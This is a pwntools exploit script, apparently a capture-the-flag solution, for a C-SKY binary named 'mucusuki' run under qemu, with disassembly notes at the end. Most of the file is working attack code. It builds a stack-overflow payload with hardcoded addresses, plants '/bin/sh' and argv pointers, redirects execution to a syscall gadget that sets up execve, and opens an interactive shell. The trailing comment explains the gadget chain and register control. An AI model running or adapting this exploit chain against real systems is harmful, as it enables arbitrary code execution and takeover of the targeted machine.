#!/usr/bin/env python3
from pwn import *

# Path to your binary
elf = ELF("./mucusuki")

# Path to qemu for C-SKY
qemu = "./qemu"

# Command line for qemu with gdb stub on port 1234
qemu_args = [qemu, "-g", "1234", elf.path]

context.terminal = ['kitty', '-e']  # Adjust to your terminal

def start():
    if args.GDB:
        # Start qemu with gdb enabled, wait for manual attach
        return process(qemu_args)
    else:
        # Normal run
        return process([qemu, elf.path])

# Start process
p = start()

if args.GDB:
    log.info("QEMU started with gdbstub at :1234")
    log.info("Attach manually with:")
    log.info("  csky-elfabiv2-gdb ./mucusuki")
    log.info("  (gdb) target remote :1234")
    pause()  # Wait here until you attach & continue in gdb

# Example interaction (works in normal mode, after gdb continues execution)

EXECVE_SYSCALL = 477


stack_buf_addr = 0x3ffffecc

syscall_gadget = 0x0000822e

syscall_num = EXECVE_SYSCALL + 0x15

BINSH = stack_buf_addr + 40
ARGV = stack_buf_addr + 64

R0 = BINSH

    # Memory Layout Diagram:
    # | Address        | Offset from r8 | Purpose           |
    # |----------------|----------------|-------------------|
    # | 0x3ffffec4     | r8 - 0x8        | r0 (command string pointer) |
    # | 0x3ffffec0     | r8 - 0xc        | r1 (argv pointer)  |
    # | 0x3fffffbc     | r8 - 0x10       | r2 (envp pointer)  |
    # | 0x3ffffec8     | r8 - 0x4        | r12 (sets r7 via AND & SUB)   |
payload = b""
payload += p32(0)              # For r2 (envp), at r8 - 0x10
payload += p32(ARGV)           # For r1 (argv), at r8 - 0xc
payload += p32(BINSH)          # For r0 (command), at r8 - 0x8
payload += p32(syscall_num)       # For r12 (to set r7), at r8 - 0x4

val_struct = len(payload) + stack_buf_addr
payload += (40 - len(payload)) * b"a"
payload += b"/bin/sh\x00"

payload += (64 - len(payload)) * b"a"
payload += p32(BINSH)
payload += p32(0)

payload += (100 - len(payload)) * b"a"
payload += p32(val_struct)
payload += p32(syscall_gadget)
print(len(payload))
p.sendline(payload)
p.interactive()


'''
buffer_addr = 0x3fffe9dc
        0000817c 00 c4 20 48     mov        r0,r0
        00008180 03 6c           mov        r0,r0
        00008182 a3 6f           mov        sp,r8
        00008184 ee d9 01 20     ld.w       r15,(sp,0x4)
        00008188 0e d9 00 20     ld.w       r8=>local_8,(sp,0x0)
        0000818c 02 14           addi       sp,sp,0x8
        0000818e 3c 78           rts
        can control this r15 , like here rts = jmp r15 , so control r15 to jump , to out addr

        r14 = sp
        r15 = stores ret addr
        r8 = Temporary / caller-saved = r14-4

        825e:	98e0      	ld.w      	r7, (r14, 0x0)
        8260:	1402      	addi      	r14, r14, 8
        8262:	783c      	jmp      	r15      

    8264:	1422      	subi      	r14, r14, 8
    8266:	dd0e2001 	st.w      	r8, (r14, 0x4)
    826a:	b8e0      	st.w      	r7, (r14, 0x0)
    826c:	6e3b      	mov      	r8, r14
    826e:	1422      	subi      	r14, r14, 8
    8270:	e4681003 	subi      	r3, r8, 4
    8274:	b300      	st.w      	r0, (r3, 0x0)
    8276:	e4681007 	subi      	r3, r8, 8
    827a:	b320      	st.w      	r1, (r3, 0x0)
    827c:	e4681007 	subi      	r3, r8, 8
    8280:	9300      	ld.w      	r0, (r3, 0x0)
    8282:	e4681003 	subi      	r3, r8, 4
    8286:	93e0      	ld.w      	r7, (r3, 0x0)
    8288:	c0002020 	trap      	0  

    8208:	1422      	subi      	r14, r14, 8
    820a:	dd0e2001 	st.w      	r8, (r14, 0x4)
    820e:	b8e0      	st.w      	r7, (r14, 0x0)
    8210:	6e3b      	mov      	r8, r14
    8212:	1424      	subi      	r14, r14, 16
    8214:	e5881003 	subi      	r12, r8, 4
    8218:	dc0c2000 	st.w      	r0, (r12, 0x0)
    821c:	e4081007 	subi      	r0, r8, 8
    8220:	b020      	st.w      	r1, (r0, 0x0)
    8222:	e428100b 	subi      	r1, r8, 12
    8226:	b140      	st.w      	r2, (r1, 0x0)
    8228:	e448100f 	subi      	r2, r8, 16
    822c:	b260      	st.w      	r3, (r2, 0x0)
    822e:	e4681007 	subi      	r3, r8, 8
    8232:	9300      	ld.w      	r0, (r3, 0x0)
    8234:	e468100b 	subi      	r3, r8, 12
    8238:	9320      	ld.w      	r1, (r3, 0x0)
    823a:	e468100f 	subi      	r3, r8, 16
    823e:	9340      	ld.w      	r2, (r3, 0x0)
    8240:	e4681003 	subi      	r3, r8, 4
    8244:	d9832000 	ld.w      	r12, (r3, 0x0)
    8248:	e46c20ff 	andi      	r3, r12, 255
    824c:	2b14      	subi      	r3, 21
    824e:	6dcf      	mov      	r7, r3
    8250:	c0002020 	trap      	0

'''